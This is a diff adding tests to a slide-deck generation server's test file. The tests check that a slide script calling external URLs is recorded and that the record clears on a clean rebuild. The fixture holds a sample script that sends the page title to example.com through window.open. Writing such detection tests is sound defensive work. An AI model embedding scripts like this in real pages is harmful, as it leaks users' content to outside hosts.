@@ -634,6 +634,38 @@ def test_generate_pptx_finalizes_html_deck(server, storage, monkeypatch):
     assert not any(k.startswith("pptx/") for k in storage.objects)
 
 
+_NAV_BODY = ('<section data-layout="Title Only"><h1 data-ph="title">Claim</h1>'
+             '<script>window.open("https://example.com/?d=" + document.title);</script></section>')
+
+
+def test_run_python_html_records_script_external_and_a_clean_rebuild_removes_it(server, storage, monkeypatch):
+    _no_pptx(monkeypatch)
+    _sandbox(monkeypatch, ["slides/body.html"])
+    storage.objects["decks/d1/slides/body.html"] = _NAV_BODY.encode()
+
+    out = _run(server)
+
+    assert "html_error" not in out, out
+    assert storage.record["htmlScriptExternal"] == [{"slug": "body", "kinds": ["popup", "external-url"]}]
+    assert "script_external" not in out  # the record's data; the warnings tell the agent
+
+    storage.objects["decks/d1/slides/body.html"] = SLIDES["body"].encode()
+    assert "html_error" not in _run(server)
+    assert "htmlScriptExternal" not in storage.record
+    assert storage.updates[-1]["htmlScriptExternal"] is None
+
+
+def test_generate_pptx_records_script_external(server, storage):
+    storage.objects["decks/d1/slides/body.html"] = _NAV_BODY.encode()
+    result = json.loads(server.generate_pptx(deck_id="d1"))
+    assert result["status"] == "completed"
+    assert storage.record["htmlScriptExternal"] == [{"slug": "body", "kinds": ["popup", "external-url"]}]
+
+    storage.objects["decks/d1/slides/body.html"] = SLIDES["body"].encode()
+    json.loads(server.generate_pptx(deck_id="d1"))
+    assert "htmlScriptExternal" not in storage.record
+
+
 def test_generate_pptx_kb_failure_is_a_warning(server, storage, monkeypatch):
     kb = MagicMock()
     kb.sync_deck.side_effect = RuntimeError("vectors down")
